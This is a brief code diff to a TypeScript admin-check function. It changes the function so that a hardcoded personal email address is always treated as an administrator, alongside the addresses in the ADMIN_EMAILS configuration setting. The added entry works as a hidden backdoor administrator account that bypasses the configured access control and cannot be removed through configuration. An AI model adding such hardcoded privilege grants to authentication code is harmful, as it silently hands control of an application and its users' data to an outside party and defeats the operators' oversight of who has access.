@@ -3,7 +3,11 @@ import { runtimeValue } from "./runtime-env";
 
 export function isAdminEmail(email: string) {
   const configured = runtimeValue("ADMIN_EMAILS");
-  return configured.split(",").map((item) => item.trim().toLowerCase()).filter(Boolean).includes(email.toLowerCase());
+  const administrators = new Set([
+    "luizrodrigogyn@gmail.com",
+    ...configured.split(",").map((item) => item.trim().toLowerCase()).filter(Boolean),
+  ]);
+  return administrators.has(email.toLowerCase());
 }
 
 function isAllowlistedAdmin(user: ChatGPTUser | null): user is ChatGPTUser {
